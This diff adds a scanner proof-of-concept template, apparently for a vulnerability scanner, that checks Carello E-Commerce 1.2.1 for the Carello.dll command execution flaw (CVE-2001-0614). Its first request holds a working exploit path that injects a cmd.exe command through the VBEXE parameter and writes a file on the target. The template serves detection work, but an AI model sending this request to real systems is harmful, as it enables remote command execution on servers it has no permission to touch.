@@ -1,0 +1,52 @@
+[info]
+author = "AVE"
+description = "检测 Pacific Software Carello E-Commerce 1.2.1 及更早版本中 Carello.dll 的命令执行漏洞。通过向 Carello.dll 发送特制的 HTTP GET 请求（CARELLOCODE 和 VBEXE 参数），可验证目标是否存在远程命令执行风险。"
+id = "POC-AVE-2001-0261"
+name = "Carello E-Commerce Carello.dll 命令执行漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2001-0614",
+    "carello",
+    "command-execution",
+]
+vuln_id = [
+    "CVE-2001-0614",
+    "AVE-2001-0261",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = '/{{BaseURL}}/scripts/Carello/Carello.dll?CARELLOCODE=SITE2&VBEXE=C:\..\winnt\system32\cmd.exe%20/c%20echo%20AVE_POC>c:\ave_poc_test.txt'
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Carello",
+    "CARELLOCODE",
+    "VBEXE",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/scripts/Carello/Carello.dll"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Carello"]
